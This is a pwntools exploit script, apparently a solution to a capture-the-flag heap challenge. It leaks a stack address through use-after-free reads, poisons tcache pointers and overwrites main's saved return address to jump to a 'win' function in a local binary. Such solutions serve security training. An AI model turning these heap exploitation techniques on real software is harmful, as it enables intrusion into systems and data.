#!/bin/python 

from pwn import *
import sys

context.arch = 'amd64'
#context.log_level = 'debug'

BUFFER_OFF = 0x16
GOAL = "win"

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def echo(idx, offset):
    proc.clean()
    proc.sendline(b"echo")
    proc.sendline(str(idx))
    proc.sendline(str(offset))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


bin_idx = 16
def overwrite_next(contents: bytes):
    global bin_idx

    ret = bin_idx
    malloc(14, ret)
    malloc(15, ret)
    bin_idx += 16

    free(15)
    free(14)

    scanf(14, contents)
    return ret


def get_custom_ptr(contents: bytes):
    bin = overwrite_next(contents)
    malloc(13, bin)
    malloc(13, bin)

    return 13


if len(sys.argv) > 2:
    proc = gdb.debug(sys.argv[1], gdbscript='''
                        pwndbg-init
                        set follow-fork-mode parent
                        nextret
                    ''')
else:
    proc = process(sys.argv[1])
elf = proc.elf

malloc(0, 0x20)
free(0)

stack_leak = u64(echo(0, 8).ljust(8, b'\x00')) + BUFFER_OFF
main_rip = stack_leak + 0x150 + 0x10
print("[$] main saved_rip: " + hex(main_rip))

idx = get_custom_ptr(p64(stack_leak ))
saved_rip = u64(echo(idx, 0).ljust(8, b'\x00')) & 0xFFFFFFFFF000 - 0x1000
dst_addr = saved_rip + (elf.symbols[GOAL] & 0x0FFF)
print("[$] dst addr: " + hex(dst_addr))

#idx = get_custom_ptr(p64(main_rip-0x10))
#canary = u64(echo(idx, 1)[:8].rjust(8, b'\x00'))
#print("[$] canary: " + hex(canary))
#scanf(idx, p64(canary) + p64(0x20))

idx = get_custom_ptr(p64(main_rip-1))
scanf(idx, b'X' + p64(dst_addr))

proc.sendline(b'quit')
proc.interactive()
